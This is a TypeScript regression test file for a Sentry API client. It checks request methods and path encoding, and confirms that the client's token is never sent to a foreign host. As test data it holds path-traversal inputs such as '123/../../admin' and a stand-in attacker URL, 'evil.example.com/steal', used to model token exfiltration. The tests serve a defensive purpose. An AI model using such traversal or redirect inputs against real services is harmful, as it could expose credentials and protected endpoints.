/**
 * Regression tests for src/api/client.ts.
 *
 * Covers:
 *  - listing an organization's issues is a GET, not a POST
 *  - every interpolated path segment is percent-encoded, so a caller-supplied
 *    id or slug cannot add path structure
 *  - an absolute URL can never redirect a request (and its Authorization
 *    header) away from the configured Sentry host
 *  - getIssueHashes yields hash objects, matching its declared return type
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import nock from 'nock';

process.env.SENTRY_URL = process.env.SENTRY_URL || 'https://sentry.test.local';
process.env.SENTRY_AUTH_TOKEN = process.env.SENTRY_AUTH_TOKEN || 'token';
process.env.SENTRY_ORG_SLUG = process.env.SENTRY_ORG_SLUG || 'org';

const { sentryClient } = await import('../../build/api/client.js');

const BASE = 'https://sentry.test.local';

describe('api/client — HTTP method contract', () => {
  beforeEach(() => nock.cleanAll());
  afterEach(() => nock.cleanAll());

  it('searchIssues issues a GET against the organization issues endpoint', async () => {
    // Only a GET is registered: a POST would find no interceptor and reject.
    const scope = nock(BASE)
      .get('/api/0/organizations/org/issues/')
      .query({ query: 'is:unresolved', limit: 25 })
      .reply(200, [{ id: '1' }]);

    const issues = await sentryClient.searchIssues('org', { query: 'is:unresolved', limit: 25 });

    assert.deepStrictEqual(issues, [{ id: '1' }]);
    assert.ok(scope.isDone(), 'the GET interceptor should have been consumed');
  });

  it('does not POST when listing organization issues', async () => {
    const post = nock(BASE).post('/api/0/organizations/org/issues/').reply(200, [{ id: 'from-post' }]);
    nock(BASE).get('/api/0/organizations/org/issues/').query(true).reply(200, [{ id: 'from-get' }]);

    const issues = await sentryClient.searchIssues('org', {});

    assert.deepStrictEqual(issues, [{ id: 'from-get' }]);
    assert.strictEqual(post.isDone(), false, 'listing issues must not use POST');
  });
});

describe('api/client — path segment encoding', () => {
  beforeEach(() => nock.cleanAll());
  afterEach(() => nock.cleanAll());

  it('encodes separators in an issue id instead of letting them add path structure', async () => {
    const scope = nock(BASE)
      .get(`/api/0/issues/${encodeURIComponent('123/../../admin')}/`)
      .reply(200, { id: 'encoded' });

    const issue = await sentryClient.getIssue('123/../../admin');

    assert.strictEqual(issue.id, 'encoded');
    assert.ok(scope.isDone());
  });

  it('encodes separators in a project slug', async () => {
    const scope = nock(BASE)
      .get(`/api/0/projects/org/${encodeURIComponent('a/b')}/issues/`)
      .reply(200, []);

    await sentryClient.listProjectIssues('org', 'a/b');

    assert.ok(scope.isDone());
  });

  it('encodes separators in an event id', async () => {
    const scope = nock(BASE)
      .get(`/api/0/projects/org/web/events/${encodeURIComponent('e/../x')}/`)
      .reply(200, { eventID: 'encoded' });

    await sentryClient.getEvent('org', 'web', 'e/../x');

    assert.ok(scope.isDone());
  });

  it('encodes a release version', async () => {
    const version = 'release/1.2.3+build';
    const scope = nock(BASE)
      .get(`/api/0/organizations/org/releases/${encodeURIComponent(version)}/`)
      .reply(200, { version });

    const release = await sentryClient.getRelease('org', version);

    assert.strictEqual(release.version, version);
    assert.ok(scope.isDone());
  });

  it('encodes a tag key', async () => {
    const scope = nock(BASE)
      .get(`/api/0/issues/999/tags/${encodeURIComponent('user.email')}/values/`)
      .query({ limit: 5 })
      .reply(200, [{ value: 'a@x.com', count: 2 }]);

    const values = await sentryClient.getIssueTagValues('999', 'user.email', { limit: 5 });

    assert.strictEqual(values[0].value, 'a@x.com');
    assert.ok(scope.isDone());
  });

  it('encodes a trace id', async () => {
    const scope = nock(BASE)
      .get(`/api/0/traces/${encodeURIComponent('t/../../x')}/`)
      .reply(200, {});

    await sentryClient.getTrace('t/../../x');

    assert.ok(scope.isDone());
  });
});

describe('api/client — absolute URLs cannot redirect a request', () => {
  beforeEach(() => {
    nock.cleanAll();
    nock.disableNetConnect();
  });

  afterEach(() => {
    nock.cleanAll();
    nock.enableNetConnect();
  });

  it('never sends a caller-supplied absolute URL to that host', async () => {
    // The request carries the Authorization header, so reaching an attacker
    // host would hand over the Sentry token.
    const attacker = nock('https://evil.example.com').get(() => true).reply(200, { stolen: true });
    const sentry = nock(BASE).get(() => true).reply(200, { ok: true });

    const response = await sentryClient.get('https://evil.example.com/steal');

    assert.strictEqual(attacker.isDone(), false, 'the attacker host must never be contacted');
    assert.ok(sentry.isDone(), 'the request must stay on the configured Sentry host');
    assert.deepStrictEqual(response, { ok: true });
  });

  it('never sends a protocol-relative URL to that host', async () => {
    const attacker = nock('https://evil.example.com').get(() => true).reply(200, { stolen: true });
    const sentry = nock(BASE).get(() => true).reply(200, { ok: true });

    await sentryClient.get('//evil.example.com/steal');

    assert.strictEqual(attacker.isDone(), false, 'the attacker host must never be contacted');
    assert.ok(sentry.isDone());
  });

  it('does not follow a cross-origin redirect', async () => {
    const sentry = nock(BASE)
      .get('/api/0/redirect/')
      .reply(302, undefined, { Location: 'https://evil.example.com/steal' });
    const attacker = nock('https://evil.example.com').get('/steal').reply(200, { stolen: true });

    await assert.rejects(() => sentryClient.get('redirect/'));

    assert.ok(sentry.isDone(), 'the configured Sentry host should receive the initial request');
    assert.strictEqual(attacker.isDone(), false, 'the attacker host must not receive the redirect');
  });
});

describe('api/client — response shapes', () => {
  beforeEach(() => nock.cleanAll());
  afterEach(() => nock.cleanAll());

  it('getIssueHashes yields hash objects, not bare strings', async () => {
    const hashes = [
      { id: 'abc123', latestEvent: { eventID: 'e1' } },
      { id: 'def456', latestEvent: { eventID: 'e2' } },
    ];
    nock(BASE).get('/api/0/issues/123/hashes/').reply(200, hashes);

    const result = await sentryClient.getIssueHashes('123');

    assert.ok(Array.isArray(result));
    assert.strictEqual(typeof result[0], 'object', 'a hash is an object with an id, not a string');
    assert.strictEqual(result[0].id, 'abc123');
    assert.strictEqual(result[0].latestEvent.eventID, 'e1');
  });

  it('mergeIssues posts the targetIds payload', async () => {
    const scope = nock(BASE).post('/api/0/issues/777/hashes/', { targetIds: ['888', '999'] }).reply(200, { ok: true });

    const result = await sentryClient.mergeIssues('777', ['888', '999']);

    assert.deepStrictEqual(result, { ok: true });
    assert.ok(scope.isDone());
  });
});
